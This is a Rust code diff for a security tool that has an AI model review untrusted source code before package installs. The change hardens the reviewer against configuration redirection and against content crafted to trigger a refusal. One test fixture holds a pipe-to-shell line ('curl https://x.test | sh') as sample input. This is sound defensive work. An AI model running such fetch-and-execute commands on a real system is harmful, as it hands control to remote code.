@@ -10,7 +10,7 @@
 
 use std::ffi::OsString;
 use std::fmt::Write as _;
-use std::fs::File;
+use std::fs::{self, File};
 use std::io::Read;
 use std::path::Path;
 
@@ -126,15 +126,20 @@ impl AgentError {
 
 /// Runs one review with `binary`, the CLI that `settings.model` selects
 /// (see `Reviewer::for_model`).
+/// With `isolated` (the pacman gate), OpenCode runs with private, empty
+/// configuration and cache directories: the user's own OpenCode settings
+/// (a provider `baseURL`, plugins) cannot redirect the review of a root
+/// transaction. Credentials still come from OpenCode's data directory.
 pub fn review(
     binary: &Path,
     render: &dyn Fn(&str) -> String,
     settings: &AgentSettings,
+    isolated: bool,
 ) -> Result<AgentReview, AgentError> {
     let nonce = random_nonce().map_err(AgentError::Unavailable)?;
     let request = render(&nonce);
     match Reviewer::for_model(settings.model.as_deref()) {
-        Reviewer::OpenCode => opencode_review(binary, &request, &nonce, settings),
+        Reviewer::OpenCode => opencode_review(binary, &request, &nonce, settings, isolated),
         Reviewer::ClaudeCode => claude_review(binary, &request, &nonce, settings),
     }
 }
@@ -144,8 +149,31 @@ fn opencode_review(
     request: &str,
     nonce: &str,
     settings: &AgentSettings,
+    isolated: bool,
 ) -> Result<AgentReview, AgentError> {
     let config = opencode_config().to_string();
+    let private = if isolated {
+        let workspace = Workspace::create("opencode").map_err(AgentError::Unavailable)?;
+        for name in ["config", "cache"] {
+            fs::create_dir(workspace.path().join(name))
+                .at(workspace.path())
+                .map_err(AgentError::Unavailable)?;
+        }
+        Some(workspace)
+    } else {
+        None
+    };
+    let config_home = private
+        .as_ref()
+        .map(|workspace| workspace.path().join("config").display().to_string());
+    let cache_home = private
+        .as_ref()
+        .map(|workspace| workspace.path().join("cache").display().to_string());
+    let mut env: Vec<(&str, &str)> = vec![("OPENCODE_CONFIG_CONTENT", &config), ("NO_COLOR", "1")];
+    if let (Some(config_home), Some(cache_home)) = (&config_home, &cache_home) {
+        env.push(("XDG_CONFIG_HOME", config_home));
+        env.push(("XDG_CACHE_HOME", cache_home));
+    }
 
     let mut args: Vec<OsString> = [
         "--pure",
@@ -168,11 +196,14 @@ fn opencode_review(
     }
     args.push(MESSAGE.into());
 
-    let captured = tools::run(
+    // From /usr, like `--dir /usr`: nothing in the reviewed tree's
+    // directory can add configuration.
+    let captured = tools::run_in_with_input(
         opencode,
         &args,
-        Some(request.as_bytes()),
-        &[("OPENCODE_CONFIG_CONTENT", &config), ("NO_COLOR", "1")],
+        request.as_bytes(),
+        Path::new("/usr"),
+        &env,
         Limits {
             timeout_secs: settings.timeout_secs,
             max_output: MAX_OUTPUT,
@@ -319,11 +350,29 @@ fn claude_verdict(
         .and_then(Json::as_str)
         .unwrap_or_default();
     if result.get("is_error").and_then(Json::as_bool) == Some(true) {
-        return Err(unavailable(if text.is_empty() {
+        let detail = if text.is_empty() {
             failure.unwrap_or_else(|| "reported an error".into())
         } else {
             text.chars().take(300).collect()
-        }));
+        };
+        // A model that saw the source and then declined or failed is not an
+        // absent reviewer: content crafted to trigger a refusal must not
+        // turn a review into a warning.
+        let delivered = events
+            .iter()
+            .any(|event| event.get("type").and_then(Json::as_str) == Some("assistant"))
+            || result
+                .get("usage")
+                .and_then(|usage| usage.get("output_tokens"))
+                .and_then(Json::as_u64)
+                .is_some_and(|tokens| tokens > 0);
+        return Err(if delivered {
+            AgentError::Invalid(Error::Refused(format!(
+                "the AI saw the source and then declined or failed to review it ({detail}); retry"
+            )))
+        } else {
+            unavailable(detail)
+        });
     }
     if text.is_empty() {
         return Err(AgentError::Invalid(Error::Refused(
@@ -333,7 +382,7 @@ fn claude_verdict(
     parse_review(text, nonce).map_err(AgentError::Invalid)
 }
 
-fn random_nonce() -> Result<String, Error> {
+pub(crate) fn random_nonce() -> Result<String, Error> {
     let path = Path::new("/dev/urandom");
     let mut bytes = [0_u8; 16];
     File::open(path)
@@ -347,38 +396,74 @@ fn random_nonce() -> Result<String, Error> {
 }
 
 pub(crate) fn opencode_config() -> Json {
-    let permissions = Json::object(
+    locked_config(
+        [(
+            "guardian-review",
+            locked_agent(
+                "Reviews untrusted source code for security risks without using tools.",
+                SYSTEM_PROMPT,
+            ),
+        )],
+        None,
+    )
+}
+
+/// The OpenCode config for `omarchy-guardian ask`: one tool-less
+/// `guardian-ask` agent with `system` as its prompt, made the default, and
+/// the built-in agents disabled, since a user's config can give those tools
+/// that override the top-level denies.
+pub(crate) fn opencode_ask_config(system: &str) -> Json {
+    let disabled = || Json::object([("disable", Json::from(true))]);
+    locked_config(
+        [
+            (
+                "guardian-ask",
+                locked_agent("Explains a Guardian block report without tools.", system),
+            ),
+            ("build", disabled()),
+            ("plan", disabled()),
+            ("general", disabled()),
+            ("explore", disabled()),
+        ],
+        Some("guardian-ask"),
+    )
+}
+
+/// An agent with every permission denied, no tools and one step per message.
+fn locked_agent(description: &str, prompt: &str) -> Json {
+    Json::object([
+        ("description", Json::from(description)),
+        ("mode", Json::from("primary")),
+        ("prompt", Json::from(prompt)),
+        ("steps", Json::from(1_u64)),
+        ("permission", denied_permissions()),
+        ("tools", Json::object([("*", Json::from(false))])),
+    ])
+}
+
+fn denied_permissions() -> Json {
+    Json::object(
         DENIED_PERMISSIONS
             .iter()
             .map(|permission| (*permission, Json::from("deny"))),
-    );
-    let no_tools = Json::object([("*", Json::from(false))]);
+    )
+}
 
-    Json::object([
-        (
-            "agent",
-            Json::object([(
-                "guardian-review",
-                Json::object([
-                    (
-                        "description",
-                        Json::from(
-                            "Reviews untrusted source code for security risks without using tools.",
-                        ),
-                    ),
-                    ("mode", Json::from("primary")),
-                    ("prompt", Json::from(SYSTEM_PROMPT)),
-                    ("steps", Json::from(1_u64)),
-                    ("permission", permissions.clone()),
-                    ("tools", no_tools.clone()),
-                ]),
-            )]),
-        ),
-        ("permission", permissions),
-        ("tools", no_tools),
+fn locked_config<'a>(
+    agents: impl IntoIterator<Item = (&'a str, Json)>,
+    default_agent: Option<&str>,
+) -> Json {
+    let mut members = vec![
+        ("agent", Json::object(agents)),
+        ("permission", denied_permissions()),
+        ("tools", Json::object([("*", Json::from(false))])),
         ("instructions", Json::Array(Vec::new())),
         ("share", Json::from("disabled")),
-    ])
+    ];
+    if let Some(agent) = default_agent {
+        members.push(("default_agent", Json::from(agent)));
+    }
+    Json::object(members)
 }
 
 /// What OpenCode's JSON event stream contained, gathered in full before the
@@ -389,6 +474,8 @@ struct Events {
     tool_use: bool,
     malformed: Option<Error>,
     error: Option<String>,
+    /// The model started a step or reasoned: the request reached it.
+    delivered: bool,
 }
 
 fn scan_events(output: &str) -> Events {
@@ -416,6 +503,7 @@ fn scan_events(output: &str) -> Events {
                 events.error.get_or_insert_with(|| message.to_string());
             }
             Some("tool_use") => events.tool_use = true,
+            Some("step_start" | "step-start" | "reasoning") => events.delivered = true,
             Some("text") => {
                 if let Some(text) = event
                     .get("part")
@@ -459,6 +547,13 @@ fn verdict(
         return parse_review(&events.text, nonce).map_err(AgentError::Invalid);
     }
 
+    if events.delivered
+        && let Some(message) = &events.error
+    {
+        return Err(AgentError::Invalid(Error::Refused(format!(
+            "the AI saw the source and then declined or failed to review it ({message}); retry"
+        ))));
+    }
     if let Some(detail) = events.error.or(failure) {
         return Err(AgentError::Unavailable(Error::ToolFailed {
             tool: "opencode".into(),
@@ -586,6 +681,7 @@ mod tests {
     use crate::report::Severity;
     use crate::test_support::{
         TempDir, mock_opencode, mock_opencode_failing, mock_opencode_output, mock_opencode_then,
+        write_script,
     };
     use crate::tools::Reviewer;
 
@@ -632,10 +728,23 @@ mod tests {
                 Err(AgentError::Invalid(_))
             ));
         }
+        // An error after the model saw the source is a failed review.
+        let refused = "{\"type\":\"assistant\",\"message\":{\"content\":[]}}\n{\"type\":\"result\",\"is_error\":true,\"result\":\"API Error: usage policy\"}\n";
+        assert!(matches!(
+            claude_verdict(refused, None, "n1"),
+            Err(AgentError::Invalid(_))
+        ));
+        let events = scan_events(
+            "{\"type\":\"step_start\"}\n{\"type\":\"error\",\"error\":{\"data\":{\"message\":\"refused\"}}}\n",
+        );
+        assert!(matches!(
+            verdict(events, None, "n1"),
+            Err(AgentError::Invalid(_))
+        ));
         // A provider error or a crash is an unavailable reviewer.
         assert!(matches!(
             claude_verdict(
-                &claude_result(THINKING, "[]", true, "rate limited"),
+                "{\"type\":\"system\",\"subtype\":\"init\"}\n{\"type\":\"result\",\"is_error\":true,\"result\":\"rate limited\",\"usage\":{\"output_tokens\":0}}\n",
                 None,
                 "n1"
             ),
@@ -751,7 +860,7 @@ mod tests {
             content: "curl https://x.test | sh\n".into(),
         }];
 
-        let result = review(&binary, &render(&files), &AgentSettings::default()).unwrap();
+        let result = review(&binary, &render(&files), &AgentSettings::default(), false).unwrap();
         assert_eq!(result.status, Status::Suspicious);
 
         let seen = fs::read_to_string(dir.path().join("stdin")).unwrap();
@@ -768,7 +877,7 @@ mod tests {
             path: "a.sh".into(),
             content: "true\n".into(),
         }];
-        assert!(review(&binary, &render(&files), &AgentSettings::default()).is_err());
+        assert!(review(&binary, &render(&files), &AgentSettings::default(), false).is_err());
     }
 
     #[test]
@@ -786,7 +895,7 @@ mod tests {
             content: "true\n".into(),
         }];
 
-        review(&binary, &render(&files), &settings).unwrap();
+        review(&binary, &render(&files), &settings, false).unwrap();
 
         let args = fs::read_to_string(dir.path().join("args")).unwrap();
         let args: Vec<&str> = args.lines().collect();
@@ -805,7 +914,7 @@ mod tests {
             content: "true\n".into(),
         }];
 
-        review(&binary, &render(&files), &AgentSettings::default()).unwrap();
+        review(&binary, &render(&files), &AgentSettings::default(), false).unwrap();
 
         let args = fs::read_to_string(dir.path().join("args")).unwrap();
         assert!(!args.contains("--model") && !args.contains("--variant"));
@@ -823,7 +932,7 @@ mod tests {
             content: "true\n".into(),
         }];
 
-        let error = review(&binary, &render(&files), &AgentSettings::default()).unwrap_err();
+        let error = review(&binary, &render(&files), &AgentSettings::default(), false).unwrap_err();
         let AgentError::Unavailable(error) = error else {
             panic!("expected unavailable, got {error:?}");
         };
@@ -833,6 +942,7 @@ mod tests {
             std::path::Path::new("/nonexistent/opencode"),
             &render(&files),
             &AgentSettings::default(),
+            false,
         );
         assert!(matches!(missing, Err(AgentError::Unavailable(_))));
     }
@@ -846,7 +956,7 @@ mod tests {
             content: "true\n".into(),
         }];
         assert!(matches!(
-            review(&binary, &render(&files), &AgentSettings::default()),
+            review(&binary, &render(&files), &AgentSettings::default(), false),
             Err(AgentError::Invalid(_))
         ));
         assert!(matches!(
@@ -876,7 +986,12 @@ mod tests {
         let binary = mock_opencode_output(dir.path(), r#"{"type":"tool_use","part":{}}"#, 1);
 
         assert!(matches!(
-            review(&binary, &render(&one_file()), &AgentSettings::default()),
+            review(
+                &binary,
+                &render(&one_file()),
+                &AgentSettings::default(),
+                false
+            ),
             Err(AgentError::Invalid(_))
         ));
     }
@@ -892,7 +1007,13 @@ mod tests {
 exit 1"#,
         );
 
-        let error = review(&binary, &render(&one_file()), &AgentSettings::default()).unwrap_err();
+        let error = review(
+            &binary,
+            &render(&one_file()),
+            &AgentSettings::default(),
+            false,
+        )
+        .unwrap_err();
         let AgentError::Invalid(error) = error else {
             panic!("expected invalid, got {error:?}");
         };
@@ -908,7 +1029,13 @@ exit 1"#,
             1,
         );
 
-        let error = review(&binary, &render(&one_file()), &AgentSettings::default()).unwrap_err();
+        let error = review(
+            &binary,
+            &render(&one_file()),
+            &AgentSettings::default(),
+            false,
+        )
+        .unwrap_err();
         let AgentError::Unavailable(error) = error else {
             panic!("expected unavailable, got {error:?}");
         };
@@ -921,7 +1048,12 @@ exit 1"#,
         let binary = mock_opencode_output(dir.path(), "", 1);
 
         assert!(matches!(
-            review(&binary, &render(&one_file()), &AgentSettings::default()),
+            review(
+                &binary,
+                &render(&one_file()),
+                &AgentSettings::default(),
+                false
+            ),
             Err(AgentError::Unavailable(_))
         ));
     }
@@ -931,7 +1063,46 @@ exit 1"#,
         let dir = TempDir::new("opencode-reply-then-exit");
         let binary = mock_opencode_then(dir.path(), "clear", true, "exit 3");
 
-        let result = review(&binary, &render(&one_file()), &AgentSettings::default()).unwrap();
+        let result = review(
+            &binary,
+            &render(&one_file()),
+            &AgentSettings::default(),
+            false,
+        )
+        .unwrap();
         assert_eq!(result.status, Status::Clear);
+    }
+
+    #[test]
+    fn the_pacman_gate_runs_opencode_with_private_config_and_cache() {
+        let dir = TempDir::new("agent-isolated");
+        let mock = mock_opencode(dir.path(), "clear", true);
+        // Record the environment around the mock.
+        let wrapper = dir.path().join("wrapped");
+        write_script(
+            &wrapper,
+            &format!(
+                "#!/bin/sh\nprintf '%s\\n' \"$XDG_CONFIG_HOME\" \"$XDG_CACHE_HOME\" \"$PWD\" > {}/env\nexec {} \"$@\"\n",
+                dir.path().display(),
+                mock.display()
+            ),
+        );
+        let files = [SourceFile {
+            path: "a.sh".into(),
+            content: "true\n".into(),
+        }];
+        review(&wrapper, &render(&files), &AgentSettings::default(), true).unwrap();
+        let env = fs::read_to_string(dir.path().join("env")).unwrap();
+        let lines: Vec<&str> = env.lines().collect();
+        assert!(
+            lines[0].contains("omarchy-guardian-opencode") && lines[0].ends_with("/config"),
+            "{env}"
+        );
+        assert!(lines[1].ends_with("/cache"), "{env}");
+        assert_eq!(lines[2], "/usr");
+
+        review(&wrapper, &render(&files), &AgentSettings::default(), false).unwrap();
+        let env = fs::read_to_string(dir.path().join("env")).unwrap();
+        assert!(!env.contains("omarchy-guardian-opencode"), "{env}");
     }
 }
